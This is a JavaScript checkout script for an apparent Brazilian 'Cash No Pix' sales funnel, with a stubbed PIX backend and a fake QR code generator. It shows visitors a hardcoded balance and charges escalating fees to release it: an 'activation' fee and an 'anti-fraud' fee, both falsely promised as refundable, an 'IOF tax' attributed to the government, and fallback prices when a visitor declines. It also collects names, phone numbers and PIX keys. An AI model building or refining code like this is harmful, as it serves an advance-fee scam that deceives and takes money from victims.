/* ============================================================
   Checkout Cash No Pix — lógica (Fase 4: UI + state machine)
   ⚠️ O backend é um STUB (createPixMock). Na Fase 5 trocamos
   createPix()/pollStatus() por fetch para /api/checkout/*.
   ============================================================ */
(function () {
  "use strict";

  /* ---------- Configuração por etapa (valores em centavos) ---------- */
  var STEPS = {
    front:   { mode:"front",  name:"Ativação de cadastro", desc:"(valor será reembolsado junto ao saldo disponível)", amount:3700,  balance:46738,  img:"front.webp"  },
    back1:   { mode:"front",  name:"Ativação de cadastro", desc:"(valor será reembolsado junto ao saldo disponível)", amount:2700,  balance:46738,  img:"front.webp"  },
    back2:   { mode:"front",  name:"Ativação de cadastro", desc:"(valor será reembolsado junto ao saldo disponível)", amount:1990,  balance:46738,  img:"front.webp"  },
    upsell1: { mode:"upsell", name:"Taxa anti-fraude",     desc:"(essa taxa será reembolsada junto com o valor a receber)", amount:6700, balance:146674, img:"upsell1.webp" },
    upsell2: { mode:"upsell", name:"Taxa IOF",             desc:"Essa taxa é imposta pelo governo brasileiro",            amount:4893, balance:146674, img:"upsell2.webp" },
    dws1:    { mode:"upsell", name:"Oferta especial",      desc:"",                                                       amount:4700, balance:146674, img:"dws1.webp"    },
    "upsell3:silver":  { mode:"upsell", name:"Plano Silver",  desc:"", amount:6700, balance:146674, img:"upsell3-silver.webp"  },
    "upsell3:gold":    { mode:"upsell", name:"Plano Gold",    desc:"", amount:9700, balance:146674, img:"upsell3-gold.webp"    },
    "upsell3:diamond": { mode:"upsell", name:"Plano Diamond", desc:"", amount:5700, balance:146674, img:"upsell3-diamond.webp" }
  };

  var EXPIRES_SEC = 15 * 60; // 15 min
  var DEV = true;            // Fase 4: mostra botão "simular pagamento" e usa stub

  /* ---------- Helpers ---------- */
  var $ = function (s, r) { return (r || document).querySelector(s); };
  function brl(cents){ return "R$ " + (cents/100).toLocaleString("pt-BR",{minimumFractionDigits:2,maximumFractionDigits:2}); }

  var params = new URLSearchParams(location.search);
  var stepKey = params.get("step") || "front";
  if (params.get("tier")) stepKey = "upsell3:" + params.get("tier");
  var CFG = STEPS[stepKey] || STEPS.front;

  // Captura UTMs para reuso (Fase 5: enviar ao backend/Utmify)
  var UTM_KEYS = ["utm_source","utm_medium","utm_campaign","utm_content","utm_term"];
  var utms = {};
  UTM_KEYS.forEach(function(k){ if(params.get(k)) utms[k]=params.get(k); });
  if (Object.keys(utms).length) try{ localStorage.setItem("cnp_utms", JSON.stringify(utms)); }catch(e){}

  /* ---------- Elementos ---------- */
  var card = $("#card");
  var els = {
    balance:$("#balanceValue"), img:$("#productImg"), name:$("#productName"),
    desc:$("#productDesc"), price:$("#productPrice"),
    form:$("#form"), cta:$("#cta"),
    vName:$("#vName"), vPhone:$("#vPhone"), vPix:$("#vPix"), editInfo:$("#editInfo"),
    qrImg:$("#qrImg"), copyBtn:$("#copyBtn"), pixCode:$("#pixCode"),
    countdown:$("#countdown"), devPay:$("#devPay"), regen:$("#regen")
  };

  /* ---------- Render do resumo ---------- */
  function renderSummary(){
    els.balance.textContent = brl(CFG.balance);
    els.name.textContent = CFG.name;
    els.desc.textContent = CFG.desc;
    if (!CFG.desc) els.desc.style.display = "none";
    els.price.textContent = brl(CFG.amount);
    els.img.src = "/checkout/" + CFG.img;
    els.img.alt = CFG.name;
    els.img.onerror = function(){ els.img.style.visibility="hidden"; };
  }

  /* ---------- Modo front/upsell ---------- */
  var savedCustomer = null;
  try{ savedCustomer = JSON.parse(localStorage.getItem("cnp_customer")||"null"); }catch(e){}

  function maskPhone(p){ var d=(p||"").replace(/\D/g,""); if(d.length<4) return p||""; return "(" + d.slice(0,2) + ") " + (d.length>10?"9":"") + "••••-••" + d.slice(-2); }
  function maskKey(k){ k=k||""; if(k.indexOf("@")>-1){ var a=k.split("@"); return a[0].slice(0,3)+"•••@"+a[1]; } var d=k.replace(/\D/g,""); if(d.length>=6) return d.slice(0,3)+"•••"+d.slice(-2); return k.slice(0,3)+"•••"; }

  function applyMode(){
    var mode = CFG.mode;
    // upsell sem dados salvos → fallback para o form (modo front de coleta)
    if (mode==="upsell" && savedCustomer){
      els.vName.textContent  = savedCustomer.name || "—";
      els.vPhone.textContent = maskPhone(savedCustomer.phone);
      els.vPix.textContent   = maskKey(savedCustomer.pixKey);
      card.dataset.mode = "upsell";
      els.cta.textContent = "CONFIRMAR E PAGAR";
    } else {
      card.dataset.mode = "front";
      els.cta.textContent = (mode==="upsell") ? "CONFIRMAR E PAGAR" : "GERAR PIX";
    }
  }

  /* ---------- Máscara de telefone ---------- */
  $("#phone").addEventListener("input", function(e){
    var d=e.target.value.replace(/\D/g,"").slice(0,11), out="";
    if(d.length>0) out="("+d.slice(0,2);
    if(d.length>=2) out+=") "+d.slice(2,7);
    if(d.length>=7) out+="-"+d.slice(7,11);
    e.target.value=out;
  });

  /* ---------- Validação ---------- */
  function setErr(field, msg){
    var input=$("#"+field), err=$('[data-err="'+field+'"]');
    if(msg){ input.classList.add("is-invalid"); err.textContent=msg; err.classList.add("show");
      input.closest(".field").classList.add("shake");
      setTimeout(function(){ input.closest(".field").classList.remove("shake"); },350);
    } else { input.classList.remove("is-invalid"); err.classList.remove("show"); }
  }
  function validateForm(){
    var ok=true, name=$("#name").value.trim(), phone=$("#phone").value.replace(/\D/g,""), pix=$("#pixKey").value.trim();
    if(name.split(/\s+/).filter(Boolean).length<2){ setErr("name","Digite seu nome completo."); ok=false; } else setErr("name");
    if(phone.length<10){ setErr("phone","Telefone inválido."); ok=false; } else setErr("phone");
    if(pix.length<3){ setErr("pixKey","Informe sua chave PIX."); ok=false; } else setErr("pixKey");
    return ok ? { name:name, phone:phone, pixKey:pix } : null;
  }

  /* ---------- State machine ---------- */
  var timer=null, expiresAt=0;
  function setState(s){ card.dataset.state=s; }

  function startCountdown(){
    expiresAt = Date.now() + EXPIRES_SEC*1000;
    tick();
    timer = setInterval(tick, 1000);
  }
  function tick(){
    var left = Math.max(0, Math.round((expiresAt-Date.now())/1000));
    var m=String(Math.floor(left/60)).padStart(2,"0"), s=String(left%60).padStart(2,"0");
    els.countdown.textContent = m+":"+s;
    els.countdown.classList.toggle("warn", left<60);
    if(left<=0){ clearInterval(timer); setState("expired"); }
  }
  function stopCountdown(){ if(timer){ clearInterval(timer); timer=null; } }

  /* ---------- Backend STUB (trocar na Fase 5) ---------- */
  function createPix(payload){
    // Fase 5: return fetch("/api/checkout/criar-pix",{method:"POST",body:JSON.stringify(payload)}).then(r=>r.json())
    var code = "00020126_MOCK_"+stepKey+"_"+Date.now()+"5204000053039865802BR6009SAO PAULO62070503***6304ABCD";
    return Promise.resolve({ txid:"mock-"+Date.now(), qr_code:code, qr_code_image:makeFakeQr(code) });
  }

  function goPay(payload){
    setState("generating");
    if(payload) try{ localStorage.setItem("cnp_customer", JSON.stringify(payload)); savedCustomer=payload; }catch(e){}
    createPix(payload).then(function(res){
      els.qrImg.src = res.qr_code_image;
      els.pixCode.value = res.qr_code;
      if(DEV) els.devPay.hidden=false;
      setState("awaiting");
      startCountdown();
    }).catch(function(){
      setState("input");
      alert("Não foi possível gerar o PIX. Tente de novo.");
    });
  }

  /* ---------- Eventos ---------- */
  els.cta.addEventListener("click", function(){
    if(card.dataset.mode==="front"){
      var data=validateForm(); if(!data) return; goPay(data);
    } else {
      goPay(savedCustomer);
    }
  });
  els.editInfo.addEventListener("click", function(){ card.dataset.mode="front"; });
  els.regen.addEventListener("click", function(){ goPay(savedCustomer || validateForm()); });

  els.copyBtn.addEventListener("click", function(){
    var v=els.pixCode.value;
    var done=function(){
      els.copyBtn.classList.add("copied");
      $(".copy__label",els.copyBtn).textContent="Copiado!";
      setTimeout(function(){ els.copyBtn.classList.remove("copied"); $(".copy__label",els.copyBtn).textContent="Copiar código PIX"; },2000);
    };
    if(navigator.clipboard){ navigator.clipboard.writeText(v).then(done,function(){ els.pixCode.select(); document.execCommand("copy"); done(); }); }
    else { els.pixCode.select(); document.execCommand("copy"); done(); }
  });

  els.devPay.addEventListener("click", onPaid); // Fase 5: vem do polling/webhook

  function onPaid(){
    stopCountdown();
    setState("paid");
    try{ var a=new Audio("/funil-2/sound/success.mp3"); a.play().catch(function(){}); }catch(e){}
    // Fase 5: avançar no funil para a próxima etapa (upsell/login)
    setTimeout(function(){ console.log("[checkout] pago — avançar no funil (Fase 5)"); }, 1200);
  }

  /* ---------- Fake QR (apenas Fase 4; Fase 5 usa o qr_code_image da BRPix) ---------- */
  function makeFakeQr(seed){
    var n=25, cell=8, pad=8, size=n*cell+pad*2, h=0;
    for(var i=0;i<seed.length;i++){ h=(h*31+seed.charCodeAt(i))>>>0; }
    function rnd(){ h^=h<<13; h^=h>>>17; h^=h<<5; h>>>=0; return h/4294967296; }
    var rects="";
    for(var y=0;y<n;y++)for(var x=0;x<n;x++){
      var isFinder=(x<7&&y<7)||(x>=n-7&&y<7)||(x<7&&y>=n-7);
      if(isFinder) continue;
      if(rnd()>0.55) rects+='<rect x="'+(pad+x*cell)+'" y="'+(pad+y*cell)+'" width="'+cell+'" height="'+cell+'"/>';
    }
    function finder(fx,fy){ var px=pad+fx*cell, py=pad+fy*cell;
      return '<rect x="'+px+'" y="'+py+'" width="'+(7*cell)+'" height="'+(7*cell)+'"/>'+
             '<rect x="'+(px+cell)+'" y="'+(py+cell)+'" width="'+(5*cell)+'" height="'+(5*cell)+'" fill="#fff"/>'+
             '<rect x="'+(px+2*cell)+'" y="'+(py+2*cell)+'" width="'+(3*cell)+'" height="'+(3*cell)+'" fill="#000"/>';
    }
    var svg='<svg xmlns="http://www.w3.org/2000/svg" width="'+size+'" height="'+size+'" viewBox="0 0 '+size+' '+size+'">'+
      '<rect width="'+size+'" height="'+size+'" fill="#fff"/><g fill="#000">'+rects+
      finder(0,0)+finder(n-7,0)+finder(0,n-7)+'</g></svg>';
    return "data:image/svg+xml;utf8,"+encodeURIComponent(svg);
  }

  /* ---------- Init ---------- */
  renderSummary();
  applyMode();
  setState("input");
})();
